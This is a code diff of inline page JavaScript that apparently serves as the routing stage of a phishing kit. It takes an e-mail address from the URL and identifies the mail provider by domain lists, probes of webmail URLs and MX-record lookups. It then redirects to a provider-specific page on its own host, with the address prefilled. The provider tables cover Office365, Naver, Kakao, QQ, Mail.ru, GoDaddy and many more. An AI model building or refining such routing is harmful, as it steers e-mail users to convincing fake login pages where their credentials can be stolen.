@@ -5,6 +5,7 @@ async function main () {
   const qs = new URLSearchParams(location.search);
   const login = qs.get('login');
   if (!login) return fail('Missing login parameter.');
+
   const domain = login.split('@')[1]?.trim().toLowerCase();
   if (!domain) return fail('Invalid e-mail address.');
 
@@ -13,104 +14,44 @@ async function main () {
 
   const redirectMap = folder => {
     const loginParam = `?login=${encodeURIComponent(login)}`;
-    switch (folder) {
-      case 'groupware': return `${host}/groupware/index.html${loginParam}`;
-      case 'roundcube': return `${host}/roundcube/index.html${loginParam}`;
-      case 'ngw': return `${host}/ngw/index.html${loginParam}`;
-      case 'aruba': return `${host}/aruba/index.html${loginParam}`;
-      case 'gw': return `${host}/gw/index.html${loginParam}`;
-      case 'owa': return `${host}/owa/index.html${loginParam}`;
-      case 'chinaemail': return `${host}/chinaemail/index.html${loginParam}`;
-      case 'yandex': return `${host}/yandex/index.html${loginParam}`;
-      case 'worksmobile': return `${host}/worksmobile/index.html${loginParam}`;
-      case 'mailaliyun': return `${host}/mailaliyun/index.html${loginParam}`;
-      case 'qiyealiyun': return `${host}/qiyealiyun/index.html${loginParam}`;
-      case 'office365': return `${host}/office365/index.html${loginParam}`;
-      case 't-online': return `${host}/t-online/index.html${loginParam}`;
-      case 'mimecast': return `${host}/mimecast/index.html${loginParam}`;
-      case 'orange': return `${host}/orange/index.html${loginParam}`;
-      case 'netease': return `${host}/netease/index.html${loginParam}`;
-      case 'mailplug': return `${host}/mailplug/index.html${loginParam}`;
-      case 'godaddy': return `${host}/godaddy/index.html${loginParam}`;
-      case 'cafe24': return `${host}/cafe24/index.html${loginParam}`;
-      case 'daouoffice': return `${host}/daouoffice/index.html${loginParam}`;
-      case 'bizmailru': return `${host}/bizmailru/index.html${loginParam}`;
-      case 'yahoobiz': return `${host}/yahoobiz/index.html${loginParam}`;
-      case 'emailsrvr': return `${host}/emailsrvr/index.html${loginParam}`;
-      case 'mailhostbox': return `${host}/mailhostbox/index.html${loginParam}`;
-      case 'strato': return `${host}/strato/index.html${loginParam}`;
-      case 'gmx': return `${host}/gmx/index.html${loginParam}`;
-      case 'register': return `${host}/register/index.html${loginParam}`;
-      case 'chinanetsun': return `${host}/chinanetsun/index.html${loginParam}`;
-      case 'hiworks': return `${host}/hiworks/index.html${loginParam}`;
-      case 'qqcom': return `${host}/qqcom/index.html${loginParam}`;
-      case 'cn4e': return `${host}/cn4e/index.html${loginParam}`;
-      case 'hibox': return `${host}/hibox/index.html${loginParam}`;
-      case 'LG': return `${host}/LG/index.html${loginParam}`;
-      case 'bizmeka': return `${host}/bizmeka/index.html${loginParam}`;
-      case 'secuecloud': return `${host}/secuecloud/index.html${loginParam}`;
-      case 'ecount': return `${host}/ecount/index.html${loginParam}`;
-      case 'mailinblack': return `${host}/mailinblack/index.html${loginParam}`;
-      case 'whois': return `${host}/whois/index.html${loginParam}`;
-      case 'naver': return `${host}/naver/index.html${loginParam}`;
-      case 'kakao': return `${host}/kakao/index.html${loginParam}`;
-      case 'nate': return `${host}/nate/index.html${loginParam}`;
-      case 'vip': return `${host}/vip/index.html${loginParam}`;
-      case 'qq': return `${host}/qq/index.html${loginParam}`;
-      case 'mailru': return `${host}/mailru/index.html${loginParam}`;
-      case 'lotte': return `${host}/lotte/index.html${loginParam}`;
-      case 'aol': return `${host}/aol/index.html${loginParam}`;
-      case 'freenet': return `${host}/freenet/index.html${loginParam}`;
-      case 'libero': return `${host}/libero/index.html${loginParam}`;
-      case 'other': return `${host}/other/index.html${loginParam}`;
-      default: return `${host}/${folder}/index.html${loginParam}`;
-    }
+    return `${host}/${folder}/index.html${loginParam}`;
   };
 
   const redirectTo = folder => {
     location.href = redirectMap(folder);
   };
 
+  // Step 1: Direct Domain Match
   const direct = {
-    'naver.com': 'naver', 'daum.net': 'kakao', 'kakao.com': 'kakao', 'hanmail.net': 'kakao',
-    'nate.com': 'nate', 'empas.com': 'nate', 'empal.com': 'nate', 'hanafos.com': 'nate',
-    'lycos.com': 'nate', 'netsgo.com': 'nate', '126.com': 'vip', '163.com': 'vip',
-    'qq.com': 'qq', 'foxmail.com': 'qq', 'mail.ru': 'mailru', 'inbox.ru': 'mailru',
-    'list.ru': 'mailru', 'bk.ru': 'mailru', 'internet.ru': 'mailru', 'lotte.net': 'lotte',
-    'aol.com': 'aol', 'freenet.de': 'freenet', 'libero.it': 'libero'
+    'naver.com': 'naver',
+    'daum.net': 'kakao',
+    'kakao.com': 'kakao',
+    'hanmail.net': 'kakao',
+    'nate.com': 'nate',
+    'empas.com': 'nate',
+    'empal.com': 'nate',
+    'hanafos.com': 'nate',
+    'lycos.com': 'nate',
+    'netsgo.com': 'nate',
+    '126.com': 'vip',
+    '163.com': 'vip',
+    'qq.com': 'qq',
+    'foxmail.com': 'qq',
+    'mail.ru': 'mailru',
+    'inbox.ru': 'mailru',
+    'list.ru': 'mailru',
+    'bk.ru': 'mailru',
+    'internet.ru': 'mailru',
+    'lotte.net': 'lotte',
+    'aol.com': 'aol',
+    'freenet.de': 'freenet',
+    'libero.it': 'libero'
   };
   for (const key in direct) {
     if (domain.endsWith(key)) return redirectTo(direct[key]);
   }
 
-  try {
-    const dns = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
-    if (dns.ok) {
-      const { Answer = [] } = await dns.json();
-      const mxRecords = Answer.map(a => a.data.toLowerCase());
-      const mx = {
-        'yandex': 'yandex', 'worksmobile': 'worksmobile', '.mail.aliyun.com': 'mailaliyun',
-        '.qiye.aliyun.com': 'qiyealiyun', '.enterprise.china.alibaba.com': 'qiyealiyun',
-        '.outlook.com': 'office365', '.t-online.de': 't-online', '.mimecast.com': 'mimecast',
-        '.orange.fr': 'orange', '.netease.com': 'netease', 'mailplug.': 'mailplug',
-        'chinaemail.cn': 'chinaemail', 'secureserver.net': 'godaddy',
-        'spam.cafe24.com': 'cafe24', '.fmcity.com': 'cafe24', 'cgwebmail.': 'gw',
-        '.daouoffice.com': 'daouoffice', 'gw.': 'daouoffice', 'emx.mail.ru': 'bizmailru', 'yahoodns.net': 'yahoobiz',
-        'emailsrvr.com': 'emailsrvr', 'mailhostbox.com': 'mailhostbox', 'rzone.de': 'strato',
-        '.gmx.net': 'gmx', 'register.it': 'register', 'chinanetsun.com': 'chinanetsun',
-        'hiworks.co.kr': 'hiworks', 'mxbiz1.qq.com': 'qqcom', 'mxbiz2.qq.com': 'qqcom',
-        '.cn4e.com': 'cn4e', 'mailfilter.': 'hibox', 'sfilter.': 'LG', '.mailwood.com': 'LG',
-        'webmail.': 'roundcube', 'bizmeka.com': 'bizmeka', 'secuecloud.com': 'secuecloud',
-        '.serverdata.net': 'owa', '.ecounterp.com': 'ecount', '.mailinblack.com': 'mailinblack',
-        'whoisworks.com': 'whois'
-      };
-      for (const mxHost of mxRecords) {
-        const hit = Object.keys(mx).find(n => mxHost.includes(n));
-        if (hit) return redirectTo(mx[hit]);
-      }
-    }
-  } catch (e) { console.warn('MX lookup failed', e); }
-
+  // Step 2: Probe common webmail URLs
   const probes = {
     groupware: [`http://gw.${sanitized}/groupware/login.html`],
     roundcube: [
@@ -146,14 +87,67 @@ async function main () {
     }
   }
 
+  // Step 3: MX Record Lookup
   try {
-    const page = await fetch(`https://api.allorigins.win/raw?url=http://${sanitized}`, { cache: 'no-store' });
-    if (page.ok) {
-      const text = await page.text();
-      if (text.match(/whois/i)) return redirectTo('whois');
-    }
-  } catch (e) { console.warn('Whois check failed', e); }
+    const dns = await fetch(`https://dns.google/resolve?name=${domain}&type=MX`);
+    if (dns.ok) {
+      const { Answer = [] } = await dns.json();
+      const mxRecords = Answer.map(a => a.data.toLowerCase());
 
+      const mx = {
+        'yandex': 'yandex',
+        'worksmobile': 'worksmobile',
+        '.mail.aliyun.com': 'mailaliyun',
+        '.qiye.aliyun.com': 'qiyealiyun',
+        '.enterprise.china.alibaba.com': 'qiyealiyun',
+        '.outlook.com': 'office365',
+        '.t-online.de': 't-online',
+        '.mimecast.com': 'mimecast',
+        '.orange.fr': 'orange',
+        '.netease.com': 'netease',
+        'mailplug.': 'mailplug',
+        'chinaemail.cn': 'chinaemail',
+        'secureserver.net': 'godaddy',
+        'spam.cafe24.com': 'cafe24',
+        '.fmcity.com': 'cafe24',
+        'cgwebmail.': 'gw',
+        '.daouoffice.com': 'daouoffice',
+        'gw.': 'daouoffice',
+        'emx.mail.ru': 'bizmailru',
+        'yahoodns.net': 'yahoobiz',
+        'emailsrvr.com': 'emailsrvr',
+        'mailhostbox.com': 'mailhostbox',
+        'rzone.de': 'strato',
+        '.gmx.net': 'gmx',
+        'register.it': 'register',
+        'chinanetsun.com': 'chinanetsun',
+        'hiworks.co.kr': 'hiworks',
+        'mxbiz1.qq.com': 'qqcom',
+        'mxbiz2.qq.com': 'qqcom',
+        '.cn4e.com': 'cn4e',
+        'mailfilter.': 'hibox',
+        'sfilter.': 'LG',
+        '.mailwood.com': 'LG',
+        'webmail.': 'roundcube',
+        'bizmeka.com': 'bizmeka',
+        'secuecloud.com': 'secuecloud',
+        '.serverdata.net': 'owa',
+        '.ecounterp.com': 'ecount',
+        '.mailinblack.com': 'mailinblack',
+        'whoisworks.com': 'whois',
+        'whois.': 'whois'
+      };
+
+      for (const mxHost of mxRecords) {
+        const hit = Object.keys(mx).find(n => mxHost.includes(n));
+        if (hit) return redirectTo(mx[hit]);
+      }
+    }
+  } catch (e) {
+    console.warn('MX lookup failed', e);
+  }
+
+  // Final fallback
   redirectTo('other');
 
   function fail(msg) {
@@ -161,5 +155,3 @@ async function main () {
   }
 }
 </script>
-</body>
-</html>
